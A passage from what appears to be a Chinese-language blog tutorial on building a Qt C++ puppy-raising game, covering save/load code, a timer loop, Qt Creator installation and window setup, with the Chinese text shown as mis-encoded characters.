class="hljs-string">&quot;../PuppiesMakeAHome/database/Save3.txt&quot;</span>)&#123;<br>        pSave=ui-&gt;save3;<br>        pRead=ui-&gt;read3;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(recordPath==<span class="hljs-string">&quot;../PuppiesMakeAHome/database/Save4.txt&quot;</span>)&#123;<br>        pSave=ui-&gt;save4;<br>        pRead=ui-&gt;read4;<br>    &#125;<br><br>    <span class="hljs-function">QFile <span class="hljs-title">Fread</span><span class="hljs-params">(recordPath)</span></span>;<br>    <span class="hljs-keyword">if</span>(pSave-&gt;<span class="hljs-built_in">text</span>()==<span class="hljs-string">&quot;æ–°å»ºå®¶åº­&quot;</span>)<br>    &#123;<br>        <span class="hljs-type">bool</span> isExist=Fread.<span class="hljs-built_in">open</span>(QIODevice::WriteOnly);<br>        <span class="hljs-keyword">if</span>(isExist)<br>        &#123;<br>            <span class="hljs-function">QDataStream <span class="hljs-title">ds</span><span class="hljs-params">(&amp;Fread)</span></span>;<br>            QString tmp=<span class="hljs-string">&quot;&quot;</span>;<br>            Family family;<br>            <span class="hljs-comment">//åˆå§‹åŒ–å®¶åº­</span><br><br>            Demo.<span class="hljs-built_in">Initial</span>();<br>            Demo.dogs.<span class="hljs-built_in">clear</span>();<br>            <span class="hljs-built_in">InitialStore</span>();<br>            <span class="hljs-built_in">InitialHome</span>();<br>            <span class="hljs-comment">//å®¶åº­ä¿¡æ¯</span><br>            <span class="hljs-keyword">while</span>(tmp==<span class="hljs-string">&quot;&quot;</span>)<br>            &#123;<br>                tmp=QInputDialog::<span class="hljs-built_in">getText</span>(<span class="hljs-keyword">this</span>,<span class="hljs-string">&quot;æç¤º&quot;</span>,<span class="hljs-built_in">QString</span>(<span class="hljs-string">&quot;&lt;h3&gt;è¯·ç»™å°å®¶èµ·ä¸ªåå­—å§ï¼š&lt;/h3&gt;&quot;</span>));<br>            &#125;<br>            Demo.<span class="hljs-built_in">setFamilyTitle</span>(tmp);<br>            ds&lt;&lt;Demo.<span class="hljs-built_in">getFamilyTitle</span>();<br>            pSave-&gt;<span class="hljs-built_in">setText</span>(Demo.<span class="hljs-built_in">getFamilyTitle</span>());<br>            pRead-&gt;<span class="hljs-built_in">setText</span>(Demo.<span class="hljs-built_in">getFamilyTitle</span>());<br><br>            Demo.<span class="hljs-built_in">setFamilyWealth</span>(<span class="hljs-number">30</span>);<br>            ds&lt;&lt;QString::<span class="hljs-built_in">number</span>(Demo.<span class="hljs-built_in">getFamilyWealth</span>());<br>            Demo.<span class="hljs-built_in">setFamilyLove</span>(<span class="hljs-number">5</span>);<br>            ds&lt;&lt;QString::<span class="hljs-built_in">number</span>(Demo.<span class="hljs-built_in">getFamilyLove</span>());<br><br>            QMessageBox::<span class="hljs-built_in">question</span>(<span class="hljs-keyword">this</span>,<span class="hljs-string">&quot;æ–°å»ºå®¶åº­æˆåŠŸ&quot;</span>,<span class="hljs-string">&quot;&lt;h3&gt;å¿«å»é¢†å…»ä¸€åªç‹—ç‹—å§ï¼&lt;/h3&gt;&quot;</span>);<br>        &#125;<br>        <span class="hljs-built_in">InitInformation</span>();<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        QMessageBox::<span class="hljs-built_in">information</span>(<span class="hljs-keyword">this</span>,<span class="hljs-string">&quot;è¯»æ¡£æˆåŠŸ&quot;</span>,<span class="hljs-string">&quot;å¿«å›å®¶çœ‹çœ‹å°ç‹—å§~&quot;</span>);<br>        <span class="hljs-type">bool</span> isExist=Fread.<span class="hljs-built_in">open</span>(QIODevice::ReadOnly);<br>        <span class="hljs-keyword">if</span>(isExist)&#123;<br>            <span class="hljs-function">QDataStream <span class="hljs-title">ds</span><span class="hljs-params">(&amp;Fread)</span></span>;<br>            QString itmp,jtmp,ktmp,stmp;<br><br>            <span class="hljs-comment">//åˆå§‹åŒ–</span><br>            Demo.<span class="hljs-built_in">Initial</span>();<br>            <span class="hljs-built_in">InitialHome</span>();<br><br>            <span class="hljs-comment">//å®¶åº­ä¿¡æ¯</span><br>            ds&gt;&gt;stmp;<br>            Demo.<span class="hljs-built_in">setFamilyTitle</span>(stmp.<span class="hljs-built_in">toUtf8</span>().<span class="hljs-built_in">data</span>());<br>            ds&gt;&gt;stmp;<br>            Demo.<span class="hljs-built_in">setFamilyWealth</span>(stmp.<span class="hljs-built_in">toUtf8</span>().<span class="hljs-built_in">toInt</span>());<br>            ds&gt;&gt;stmp;<br>            Demo.<span class="hljs-built_in">setFamilyLove</span>(stmp.<span class="hljs-built_in">toUtf8</span>().<span class="hljs-built_in">toInt</span>());<br>            ds&gt;&gt;stmp;<br>            Demo.<span class="hljs-built_in">setFamilyReserveBonse</span>(stmp.<span class="hljs-built_in">toUtf8</span>().<span class="hljs-built_in">toInt</span>());<br>            ds&gt;&gt;stmp;<br>            Demo.<span class="hljs-built_in">setFamilyReserveDogfood</span>(stmp.<span class="hljs-built_in">toUtf8</span>().<span class="hljs-built_in">toInt</span>());<br>            ds&gt;&gt;stmp;<br>            Demo.<span class="hljs-built_in">setFamilyReserveMedicine</span>(stmp.<span class="hljs-built_in">toUtf8</span>().<span class="hljs-built_in">toInt</span>());<br>            ds&gt;&gt;stmp;<br>            Demo.<span class="hljs-built_in">setPlayerTime</span>(stmp.<span class="hljs-built_in">toUtf8</span>().<span class="hljs-built_in">toInt</span>());<br>            ds&gt;&gt;stmp;<br>            Demo.member=stmp.<span class="hljs-built_in">toUtf8</span>().<span class="hljs-built_in">toInt</span>();<br><br>            <span class="hljs-comment">//ç‹—ç‹—ä¿¡æ¯</span><br>            Dog *dogTmp;  <span class="hljs-comment">// åœ¨ if-else ç»“æ„ä¹‹å‰å£°æ˜</span><br><br>            ds &gt;&gt; itmp;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; itmp.<span class="hljs-built_in">toUtf8</span>().<span class="hljs-built_in">toInt</span>(); j++)<br>            &#123;<br>                <span class="hljs-keyword">if</span> (Demo.member &gt; <span class="hljs-number">4</span>) &#123;<br>                    dogTmp = <span class="hljs-keyword">new</span> <span class="hljs-built_in">BigDog</span>();  <span class="hljs-comment">// åˆå§‹åŒ–å˜é‡</span><br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    dogTmp = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SmallDog</span>();  <span class="hljs-comment">// åˆå§‹åŒ–å˜é‡</span><br>                &#125;<br><br>                ds&gt;&gt;stmp;<br>                dogTmp-&gt;<span class="hljs-built_in">setDogName</span>(stmp.<span class="hljs-built_in">toUtf8</span>().<span class="hljs-built_in">data</span>());<br>                ds&gt;&gt;stmp;<br>                dogTmp-&gt;<span class="hljs-built_in">setDogAbility</span>(stmp.<span class="hljs-built_in">toUtf8</span>().<span class="hljs-built_in">toInt</span>());<br>                ds&gt;&gt;stmp;<br>                dogTmp-&gt;<span class="hljs-built_in">setDogEnergy</span>(stmp.<span class="hljs-built_in">toUtf8</span>().<span class="hljs-built_in">toDouble</span>());<br>                ds&gt;&gt;stmp;<br>                dogTmp-&gt;<span class="hljs-built_in">setDogIll</span>(stmp.<span class="hljs-built_in">toUtf8</span>().<span class="hljs-built_in">toInt</span>());<br>                ds&gt;&gt;stmp;<br>                dogTmp-&gt;<span class="hljs-built_in">setDogState</span>(stmp.<span class="hljs-built_in">toUtf8</span>().<span class="hljs-built_in">toInt</span>());<br>                ds&gt;&gt;stmp;<br>                dogTmp-&gt;<span class="hljs-built_in">setDogWorktime</span>(stmp.<span class="hljs-built_in">toUtf8</span>().<span class="hljs-built_in">toInt</span>());<br>                Demo.dogs.<span class="hljs-built_in">push_back</span>(dogTmp);<br><br>            &#125;<br>        &#125;<br>    &#125;<br>    Fread.<span class="hljs-built_in">close</span>();<br>    haveLoadGame=<span class="hljs-number">1</span>;<br>    <span class="hljs-built_in">renovate</span>();<br>    <span class="hljs-built_in">InitialHome</span>();<br><br>    ui-&gt;stackedWidget-&gt;<span class="hljs-built_in">setCurrentWidget</span>(ui-&gt;home);<br><br>    <span class="hljs-comment">//ç¦ç”¨/å¯ç”¨æŒ‰é’®</span><br>    <span class="hljs-keyword">if</span>(haveLoadGame==<span class="hljs-number">0</span>)&#123;<br>        ui-&gt;pushButton_newmember-&gt;<span class="hljs-built_in">setEnabled</span>(<span class="hljs-literal">false</span>);<br>        ui-&gt;pushButton_gotostore-&gt;<span class="hljs-built_in">setEnabled</span>(<span class="hljs-literal">false</span>);<br>        ui-&gt;pushButton_honor-&gt;<span class="hljs-built_in">setEnabled</span>(<span class="hljs-literal">false</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        ui-&gt;pushButton_save-&gt;<span class="hljs-built_in">setEnabled</span>(<span class="hljs-literal">true</span>);<br>    &#125;<br><br>&#125;<br><br><span class="hljs-comment">//å­˜æ¡£</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">ShiJX_Widget::SaveRecord</span><span class="hljs-params">(QString recordPath)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> ret=QMessageBox::<span class="hljs-built_in">question</span>(<span class="hljs-keyword">this</span>,<span class="hljs-string">&quot;æç¤º&quot;</span>,<span class="hljs-string">&quot;ç¡®å®šè¦†ç›–å­˜æ¡£?&quot;</span>);<br>    <span class="hljs-keyword">if</span>(ret==QMessageBox::No) <span class="hljs-keyword">return</span>;<br><br>    QPushButton* pSave=ui-&gt;save1,*pRead=ui-&gt;read1;<br>    <span class="hljs-keyword">if</span>(recordPath==<span class="hljs-string">&quot;../PuppiesMakeAHome/database/Save1.txt&quot;</span>)&#123;<br>        pSave=ui-&gt;save1;<br>        pRead=ui-&gt;read1;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(recordPath==<span class="hljs-string">&quot;../PuppiesMakeAHome/database/Save2.txt&quot;</span>)&#123;<br>        pSave=ui-&gt;save2;<br>        pRead=ui-&gt;read2;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(recordPath==<span class="hljs-string">&quot;../PuppiesMakeAHome/database/Save3.txt&quot;</span>)&#123;<br>        pSave=ui-&gt;save3;<br>        pRead=ui-&gt;read3;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(recordPath==<span class="hljs-string">&quot;../PuppiesMakeAHome/database/Save4.txt&quot;</span>)&#123;<br>        pSave=ui-&gt;save4;<br>        pRead=ui-&gt;read4;<br>    &#125;<br><br><br>    <span class="hljs-function">QFile <span class="hljs-title">Fread</span><span class="hljs-params">(recordPath)</span></span>;<br>    <span class="hljs-type">bool</span> isExist=Fread.<span class="hljs-built_in">open</span>(QIODevice::WriteOnly);<br>    <span class="hljs-keyword">if</span>(isExist)<br>    &#123;<br>        <span class="hljs-function">QDataStream <span class="hljs-title">ds</span><span class="hljs-params">(&amp;Fread)</span></span>;<br>        <br><span class="hljs-comment">//æŒ‰é¡ºåºå­˜å‚¨å…³é”®ä¿¡æ¯ï¼Œè¯»æ¡£é¡ºåºéœ€å’Œå­˜æ¡£é¡ºåºä¸€è‡´</span><br>        <br>        <span class="hljs-comment">//å®¶åº­ä¿¡æ¯</span><br>        ds&lt;&lt;Demo.<span class="hljs-built_in">getFamilyTitle</span>();<br>        pSave-&gt;<span class="hljs-built_in">setText</span>(Demo.<span class="hljs-built_in">getFamilyTitle</span>());<br>        pRead-&gt;<span class="hljs-built_in">setText</span>(Demo.<span class="hljs-built_in">getFamilyTitle</span>());<br>        ds&lt;&lt;QString::<span class="hljs-built_in">number</span>(Demo.<span class="hljs-built_in">getFamilyWealth</span>());<br>        ds&lt;&lt;QString::<span class="hljs-built_in">number</span>(Demo.<span class="hljs-built_in">getFamilyLove</span>());<br>        ds&lt;&lt;QString::<span class="hljs-built_in">number</span>(Demo.<span class="hljs-built_in">getFamilyReserveBonse</span>());<br>        ds&lt;&lt;QString::<span class="hljs-built_in">number</span>(Demo.<span class="hljs-built_in">getFamilyReserveDogfood</span>());<br>        ds&lt;&lt;QString::<span class="hljs-built_in">number</span>(Demo.<span class="hljs-built_in">getFamilyReserveMedicine</span>());<br>        ds&lt;&lt;QString::<span class="hljs-built_in">number</span>(Demo.<span class="hljs-built_in">getPlayerTime</span>());<br>        ds&lt;&lt;QString::<span class="hljs-built_in">number</span>(Demo.member);<br><br>        <span class="hljs-comment">//ç‹—ç‹—ä¿¡æ¯</span><br>        ds&lt;&lt;QString::<span class="hljs-built_in">number</span>(Demo.dogs.<span class="hljs-built_in">size</span>());<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;Demo.dogs.<span class="hljs-built_in">size</span>();j++)<br>        &#123;<br>            ds&lt;&lt;Demo.dogs[j]-&gt;<span class="hljs-built_in">getDogName</span>();<br>            ds&lt;&lt;QString::<span class="hljs-built_in">number</span>(Demo.dogs[j]-&gt;<span class="hljs-built_in">getDogAbility</span>());<br>            ds&lt;&lt;QString::<span class="hljs-built_in">number</span>(Demo.dogs[j]-&gt;<span class="hljs-built_in">getDogEnergy</span>());<br>            ds&lt;&lt;QString::<span class="hljs-built_in">number</span>(Demo.dogs[j]-&gt;<span class="hljs-built_in">getDogIll</span>());<br>            ds&lt;&lt;QString::<span class="hljs-built_in">number</span>(Demo.dogs[j]-&gt;<span class="hljs-built_in">getDogState</span>());<br>            ds&lt;&lt;QString::<span class="hljs-built_in">number</span>(Demo.dogs[j]-&gt;<span class="hljs-built_in">getDogWorktime</span>());<br>        &#125;<br>    &#125;<br>    Fread.<span class="hljs-built_in">close</span>();<br>    <span class="hljs-built_in">InitialRecord</span>();<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="å®šæ—¶å™¨äº‹ä»¶"><a href="#å®šæ—¶å™¨äº‹ä»¶" class="headerlink" title="å®šæ—¶å™¨äº‹ä»¶"></a>å®šæ—¶å™¨äº‹ä»¶</h5><p>éœ€è¦åœ¨ä¸»ç•Œé¢å¤´æ–‡ä»¶ä¸­å£°æ˜å¦‚ä¸‹éƒ¨åˆ†:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;QTimer&gt;</span></span><br><span class="hljs-comment">//public</span><br><span class="hljs-type">int</span> millisecondPerHour=<span class="hljs-number">10000</span>;      <span class="hljs-comment">//æ¸¸æˆé€Ÿç‡</span><br><span class="hljs-type">int</span> timerKiller;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">timerEvent</span><span class="hljs-params">(QTimerEvent *e)</span></span>;  <span class="hljs-comment">//è®¡æ—¶å™¨äº‹ä»¶</span><br></code></pre></td></tr></table></figure><p>cppæ–‡ä»¶ä¸­æ„é€ å¹¶ä½¿ç”¨å®šæ—¶å™¨ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-comment">//éœ€è¦æŒ‰æ—¶é—´åˆ·æ–°çš„å‡½æ•°ä¸€èµ·å†™åœ¨å®šæ—¶å™¨æ—¶é—´é‡Œ</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">ShiJX_Widget::timerEvent</span><span class="hljs-params">(QTimerEvent *)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> x;<br>    x=Demo.<span class="hljs-built_in">getPlayerTime</span>();<br>    Demo.<span class="hljs-built_in">setPlayerTime</span>(++x);<br>    <span class="hljs-built_in">InitialHome</span>();<br>    <span class="hljs-comment">//renovate();</span><br>    <span class="hljs-built_in">DogGrowing</span>();<br>    <span class="hljs-built_in">Initialchoose</span>();<br>&#125;<br><br><span class="hljs-comment">//åœæ­¢å®šæ—¶å™¨è¯­å¥ï¼Œæ’å…¥åœ¨åŠŸèƒ½å‡½æ•°ä¸­</span><br> <span class="hljs-built_in">killTimer</span>(timerKiller);<br><span class="hljs-comment">//å¼€å¯å®šæ—¶å™¨è¯­å¥</span><br>timerKiller=<span class="hljs-built_in">startTimer</span>(millisecondPerHour);<br></code></pre></td></tr></table></figure><h3 id="6-QTå›¾å½¢åŒ–ç•Œé¢éƒ¨åˆ†"><a href="#6-QTå›¾å½¢åŒ–ç•Œé¢éƒ¨åˆ†" class="headerlink" title="6.QTå›¾å½¢åŒ–ç•Œé¢éƒ¨åˆ†"></a>6.QTå›¾å½¢åŒ–ç•Œé¢éƒ¨åˆ†</h3><h4 id="6-1-QTç¯å¢ƒå‡†å¤‡"><a href="#6-1-QTç¯å¢ƒå‡†å¤‡" class="headerlink" title="6.1 QTç¯å¢ƒå‡†å¤‡"></a>6.1 QTç¯å¢ƒå‡†å¤‡</h4><blockquote><p>æˆ‘ä»¬ä¸‹è½½çš„è¿™ä¸ªç¨‹åºå°±æ˜¯QT Creator</p></blockquote><p>é¦–å…ˆä¸‹è½½QTï¼Œä¸‹è½½é“¾æ¥ï¼š<a href="https://download.qt.io/">Index of &#x2F; (qt.io)</a>ï¼Œé€‰æ‹© archive - qt&#x2F; </p><p>æˆ‘é€‰æ‹©äº†5.12.3ç‰ˆæœ¬ï¼Œç‚¹å‡»ç›´æ¥ä¸‹è½½ï¼Œè¿˜æŒºæ…¢çš„ğŸ¥²</p><p>ä¸‹è½½ä¹‹åè¿è¡Œ</p><p><img src="/img/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/Snipaste_2023-06-25_14-15-44.png"></p><p>nextä¹‹åæç¤ºä½ ç™»å½•ï¼Œæ²¡æœ‰è´¦å·å»æ³¨å†Œä¸€ä¸ªå°±è¡Œï¼Œåªéœ€è¦å¡«ä¸€ä¸ªé‚®ç®±å’Œå¯†ç å°±è¡Œã€‚</p><blockquote><p>æˆ‘çœ‹åˆ°çš„æ•™ç¨‹é‡Œéƒ½æ˜¯ç›´æ¥è·³è¿‡ï¼Œä½†ç°åœ¨å¥½åƒä¸è¡Œäº†</p></blockquote><p>æ¥ä¸‹æ¥é€‰æ‹©å®‰è£…è·¯å¾„ï¼Œæˆ‘æ”¾åœ¨äº†Dç›˜å’Œè¿è¡Œç¨‹åºåœ¨ä¸€ä¸ªæ–‡ä»¶å¤¹é‡Œ</p><p><img src="/img/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/Snipaste_2023-06-25_14-23-30.png"></p><p>é€‰æ‹©éœ€è¦çš„ç»„ä»¶ï¼Œå…¨é€‰çš„è¯å å†…å­˜å¾ˆå¤§æ²¡å¿…è¦ï¼Œæ¯•ç«Ÿæˆ‘ä»¬åªæ˜¯åšä¸ªä½œä¸šåˆä¸ä¼šç”¨å®ƒåšå¾ˆå¤šä¸œè¥¿ã€‚</p><p><img src="/img/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/Snipaste_2023-06-25_14-25-33.png"></p><p>è¿™é‡Œè¦æ”¹æˆåŒæ„å—·ğŸ‘‡ğŸ¼</p><p><img src="/img/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/Snipaste_2023-06-25_14-29-48.png"></p><p>ä¸‹ä¸€é¡µå¿˜è®°æˆªå›¾äº†å°±æ˜¯å®‰è£…æ¡Œé¢å¿«æ·æ–¹å¼ï¼Œç›´æ¥é»˜è®¤nextå°±å¥½ã€‚æ¥ä¸‹æ¥å°±æ˜¯ç­‰å¾…å®‰è£…å•¦ï¼Œæ—¶é—´å¾ˆé•¿å¯ä»¥å»è·‘ä¸ªä¸¤å…¬é‡Œã€‚</p><p>æœ‰äº›æ•™ç¨‹ä¸Šä¼šè®²åˆ°é…ç½®ç¯å¢ƒå˜é‡ï¼Œå› ä¸ºæˆ‘æœ¬æ¥å°±æœ‰C++çš„ç¼–è¯‘ç¯å¢ƒå°±ä¸éœ€è¦è¾£</p><h5 id="åœŸç‹—å‘è¨€"><a href="#åœŸç‹—å‘è¨€" class="headerlink" title="åœŸç‹—å‘è¨€"></a>åœŸç‹—å‘è¨€</h5><p>Qt Creatoræ˜¯ä¸€ä¸ªé›†æˆç¯å¢ƒï¼Œå®ƒé›†æˆäº†Qt Designerï¼Œå¯ä»¥ç›´æ¥ä»Qt Creatorä¸­æ‰“å¼€å’Œç¼–è¾‘.uiæ–‡ä»¶ã€‚æˆ‘ä»¬ä¹Ÿå¯ä»¥æœç´¢åˆ°Qt Designerè¿è¡Œç¨‹åºå¹¶å•ç‹¬ä½¿ç”¨å®ƒã€‚</p><p>æˆ‘è®¤ä¸ºå¦‚æœæœ‰åŒå±ï¼Œå†å¼€ä¸€ä¸ªQt Designerå•ç‹¬ç¼–è¾‘é¡µé¢å¸ƒå±€å·¥ä½œæ•ˆç‡æ›´é«˜ã€‚</p><h4 id="6-2-QTè¾¹å­¦è¾¹å†™"><a href="#6-2-QTè¾¹å­¦è¾¹å†™" class="headerlink" title="6.2 QTè¾¹å­¦è¾¹å†™"></a>6.2 QTè¾¹å­¦è¾¹å†™</h4><p><strong>QTé¡¹ç›®éœ€æ±‚</strong></p><ul><li>æ¸¸æˆèƒŒæ™¯ä¸ºä¸€ä¸ªæˆ¿é—´å†…éƒ¨çš„é™æ€å›¾ç‰‡</li><li>é¼ æ ‡æ‚¬åœåœ¨å®¶åº­æˆå‘˜å°ç‹—èº«ä¸Šæ—¶æ˜¾ç¤ºå¯¹åº”çš„å®¶åº­æˆå‘˜çš„ä¿¡æ¯</li><li>ç‚¹å‡»å°ç‹—å®¶åº­æˆå‘˜å¯ä»¥é€‰æ‹©è¦è¿›è¡Œçš„æ´»åŠ¨</li><li>é¡µé¢ä¾§è¾¹æœ‰å‡ ä¸ªé€‰é¡¹å¯ä»¥é€‰æ‹©å¯¹åº”çš„æ´»åŠ¨</li><li>é¡µé¢é¡¶éƒ¨æ˜¾ç¤ºå®¶åº­ä¿¡æ¯</li></ul><h5 id="6-2-1-åˆ›å»ºæ–°é¡¹ç›®"><a href="#6-2-1-åˆ›å»ºæ–°é¡¹ç›®" class="headerlink" title="6.2.1 åˆ›å»ºæ–°é¡¹ç›®"></a>6.2.1 åˆ›å»ºæ–°é¡¹ç›®</h5><p>é€‰æ‹©æ–°å»ºnew projectï¼Œchooseç¬¬ä¸€ä¸ªï¼Œè®¾ç½®æ„å»ºè·¯å¾„ååœ¨ç±»åé€‰æ‹©éƒ¨åˆ†é€‰æ‹©widgetï¼Œæ³¨æ„è·¯å¾„ä¸­ä¸èƒ½æœ‰ä¸­æ–‡ã€‚</p><p>è¿™ä¸ªåœ°æ–¹è¦æŠŠå‹¾é€‰å–æ¶ˆğŸ‘‡ğŸ¼</p><p><img src="/img/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/Snipaste_2023-06-25_15-27-02.png"></p><p>ä¼šç›´æ¥ç”Ÿæˆæ¡†æ¶ï¼Œè¿™æ—¶å¦‚æœ<code>ctrl+R</code>ï¼ˆç¼–è¯‘å¹¶è¿è¡Œï¼‰ä¼šå¼¹å‡ºä¸€ä¸ªç©ºçš„å°ç™½æ¡†</p><p><img src="/img/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/Snipaste_2023-06-25_15-28-34.png"></p><h5 id="6-2-2-ä¸»åœºæ™¯è®¾ç½®"><a href="#6-2-2-ä¸»åœºæ™¯è®¾ç½®" class="headerlink" title="6.2.2 ä¸»åœºæ™¯è®¾ç½®"></a>6.2.2 ä¸»åœºæ™¯è®¾ç½®</h5><p>æ–°å»ºä¸€ä¸ªå¤´æ–‡ä»¶config.hï¼Œæ·»åŠ ä¸»åœºæ™¯ä¿¡æ¯</p><h6 id="çª—å£å¤§å°å’Œæ ‡é¢˜è®¾ç½®"><a href="#çª—å£å¤§å°å’Œæ ‡é¢˜è®¾ç½®" class="headerlink" title="çª—å£å¤§å°å’Œæ ‡é¢˜è®¾ç½®"></a>çª—å£å¤§å°å’Œæ ‡é¢˜è®¾ç½®</h6><p>å¯¹åº”å›¾ç‰‡ä¿¡æ¯è®¾ç½®ç›¸å¯¹åº”çš„ç•Œé¢ä¿¡æ¯ï¼Œåœ¨è¿™é‡Œæˆ‘çš„å›¾ç‰‡æœ‰ç‚¹å°ï¼Œæ‰€ä»¥æˆ‘æŠŠå¯¹åº”æ•°æ®éƒ½ä¹˜äº†2</p><p><img src="/img/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/Snipaste_2023-06-26_13-57-38.png"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//æ¸¸æˆé…ç½®æ•°æ®</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> GAME_WIDTH  1282  <span class="hljs-comment">//ç•Œé¢çš„å®½åº¦</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> GAME_HEIGHT 792   <span class="hljs-comment">//ç•Œé¢çš„é«˜åº¦</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> GAME_TITLE <span class="hljs-string">&quot;å°ç‹—æ’‘èµ·ä¸€ä¸ªå®¶&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> GAME_ICON <span class="hljs-string">&quot;:/img/favicon.ico&quot;</span> <span class="hljs-comment">//å›¾æ ‡åŠ è½½è·¯å¾„</span></span><br></code></pre></td></tr></table></figure><p>å†åœ¨ä¸»å¤´æ–‡ä»¶ä¸­æ·»åŠ ç›¸åº”è¯­å¥ï¼Œå¿«æ·é”®alt+enteråœ¨.cppæ–‡ä»¶ä¸­æ·»åŠ å®šä¹‰</p><p><img src="/img/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/Snipaste_2023-06-26_14-09-45.png"></p><p>å¯¹åº”çš„.cppä»£ç ï¼Œè®°å¾—åœ¨ç¬¬ä¸€ä¸ªå‡½æ•°ä¸­å£°æ˜<code>initScene()</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//åˆå§‹åŒ–ç•Œé¢é…ç½®</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">MainWindow::initScene</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//è®¾ç½®çª—å£å°ºå¯¸</span><br>    <span class="hljs-built_in">setFixedSize</span>(GAME_WIDTH,GAME_HEIGHT);<br><br>    <span class="hljs-comment">//è®¾ç½®æ ‡é¢˜</span><br>    <span class="hljs-built_in">setWindowTitle</span>(GAME_TITLE);<br><br>    <span class="hljs-comment">//åŠ è½½å›¾æ ‡</span><br>    <span class="hljs-built_in">setWindowIcon</span>(<span class="hljs-built_in">QIcon</span>(GAME_ICON));<br>&#125;<br></code></pre></td></tr></table></figure><h6 id="èƒŒæ™¯å’Œå›¾æ ‡è®¾ç½®"><a href="#èƒŒæ™¯å’Œå›¾æ ‡è®¾ç½®" class="headerlink" title="èƒŒæ™¯å’Œå›¾æ ‡è®¾ç½®"></a>èƒŒæ™¯å’Œå›¾æ ‡è®¾ç½®</h6><p>åœ¨å½“å‰æ–‡ä»¶å¤¹ä¸‹æ–°å»ºæ–‡ä»¶ï¼Œé€‰æ‹©QT-resource</p><p><img src="/img/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/Snipaste_2023-06-26_14-21-47.png"></p><p>å³é”®å•å‡»æ–‡ä»¶æ‰“å¼€ï¼ŒæŠŠå›¾ç‰‡ç´ æéƒ½æ”¾è¿›å»</p><p><img src="/img/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/Snipaste_2023-06-26_15-33-21.png"></p><blockquote><p>è‡³æ­¤ï¼Œæˆ‘æ¨ç¿»é‡æ¥ã€‚å‘ç°è‡ªå·±å»ºæ–‡ä»¶çš„æ—¶å€™å»ºæˆäº†mainwindowsã€‚ğŸ¥²</p></blockquote><h6 id="UIç•Œé¢"><a href="#UIç•Œé¢" class="headerlink" 